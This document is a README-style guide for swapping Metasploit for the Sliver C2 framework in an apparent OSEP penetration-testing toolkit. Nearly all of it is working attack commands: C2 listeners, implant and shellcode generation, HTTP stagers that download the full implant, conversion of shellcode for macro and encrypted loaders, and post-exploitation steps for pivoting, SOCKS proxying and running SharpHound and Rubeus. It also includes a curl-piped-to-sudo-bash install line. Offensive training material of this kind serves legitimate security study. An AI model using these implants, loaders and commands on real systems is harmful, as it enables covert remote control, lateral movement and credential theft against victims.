# Sliver C2 — OSEP Integration Guide

This directory replaces the Metasploit (`msfvenom` / `multi/handler` / `meterpreter`)
workflow with **Sliver** across the rest of `osep-tools`.

---

## 1. Install & start Sliver

```bash
# One-liner (Linux) — installs the sliver-server + sliver client
curl https://sliver.sh/install | sudo bash

# Start the server (daemon), then open the client console
sliver-server daemon &
sliver
```

Implant generation happens inside the `sliver` console (`sliver >`).

---

## 2. Start a C2 listener

Pick the transport that fits the target egress. mTLS and HTTPS are the two most
commonly used for OSEP.

```text
# Mutual TLS
sliver > mtls   --lhost <LHOST> --lport 8888

# HTTPS / HTTP
sliver > https  --lhost <LHOST> --lport 443
sliver > http   --lhost <LHOST> --lport 80

# WireGuard (fast, needs wg tooling on the server)
sliver > wg     --lhost <LHOST> --lport 53

# DNS
sliver > dns    --domains <domain>
```

List listeners with `jobs`. Each listener needs a matching implant, so generate
**after** the listener is up.

---

## 3. Generate implants / shellcode

The `generate` output format maps directly onto the existing osep-tools loaders:

| `--format` | Output | Feed it into |
|---|---|---|
| `shellcode` | Raw PIC shellcode (MBs — full Go implant) | `sliver2arrays.py` → AES/XOR/VBA encryptors, NimSyscallPacker |
| `raw` | Standalone `.exe` | Direct delivery, or re-pack with NimSyscallPacker |
| `csharp` | C# `byte[]` array | `aes-shellcode-encryption.cs` |
| `ps1` | PowerShell `[Byte[]]` array | `ps-shellcode-runner.ps1` |
| `nim` | Nim `array[.., byte]` | A Nim loader |
| `service` | Windows service binary | Persistence |
| `shared-library` | DLL | DLL sideload / reflective load |

### Examples

```text
# Full implant as raw shellcode (large — a fixed 4KB alloc would fail, the
# loaders now allocate shellcode.Length)
sliver > generate --mtls <LHOST>:8888 --format shellcode --save /tmp/sc.bin

# Directly as C# / PowerShell arrays
sliver > generate --mtls <LHOST>:8888 --format csharp --save /tmp/sc.cs
sliver > generate --mtls <LHOST>:8888 --format ps1   --save /tmp/sc.ps1

# Standalone EXE
sliver > generate --mtls <LHOST>:8888 --format raw --save /tmp/implant.exe
```

### Sizing note (important)

A full Sliver implant is **multi-MB** (Go runtime). The original osep-tools
runners hard-coded `VirtualAlloc(..., 0x1000, ...)` (4 KB) — those have been
fixed to allocate `shellcode.Length`. If you need a *small* payload (tight VBA
or shellcode runner), use a **stage listener** instead (next section) so the
injected blob is only a few hundred bytes.

---

## 4. Staged payloads (small shellcode)

A stager downloads the full implant over HTTP at runtime — keeps the injected
shellcode tiny.

```text
# 1. Create a profile describing the implant
sliver > profiles new --mtls <LHOST>:8888 --format shellcode my-profile

# 2. Start a stage listener that serves the profile over HTTP(S)
sliver > stage-listener --url http://<LHOST>:8080 --profile my-profile

# 3. Generate the (tiny) stager
sliver > generate --format shellcode --stage-listener http://<LHOST>:8080 --save /tmp/stager.bin
```

Feed `/tmp/stager.bin` into `sliver2arrays.py` and any loader.

---

## 5. Working with sessions / beacons

```text
sliver > sessions            # interactive sessions
sliver > beacons             # beacon implants
sliver > use <session-id>    # interact with a session
sliver > use -b <beacon-id>  # interact with a beacon
```

```text
# Implant a shellcode runner while a session is active
sliver (IMPLANT) > upload /tmp/runner.exe
sliver (IMPLANT) > execute -o runner.exe
```

---

## 6. Shellcode format conversion (`sliver2arrays.py`)

```bash
# Sliver raw shellcode -> C# / PS1 / VBA / Nim array syntax
python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp
python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1
python3 sliver/sliver2arrays.py /tmp/sc.bin --vba
python3 sliver/sliver2arrays.py /tmp/sc.bin --nim
python3 sliver/sliver2arrays.py /tmp/sc.bin --all
```

Then paste the output into the matching encryptor/loader (e.g. feed the C#
output into `aes-shellcode-encryption.cs`, the VBA output into the
`word-macro` runners, etc.).

---

## 7. Post-exploitation helpers

```text
sliver (IMPLANT) > portfwd add --remote 127.0.0.1:3389 --bind 127.0.0.1:13389   # pivot
sliver (IMPLANT) > socks5 start                                                  # SOCKS proxy
sliver (IMPLANT) > execute-assembly /path/to/SharpHound.exe                       # run .NET tooling
sliver (IMPLANT) > armory install rubeus                                          # BOFs / tools
```

For lateral movement see `../lateral-movement/` (WinRM, WMI, persistence) and
`../nimsyscallpacker/` for syscall-based payload packing.
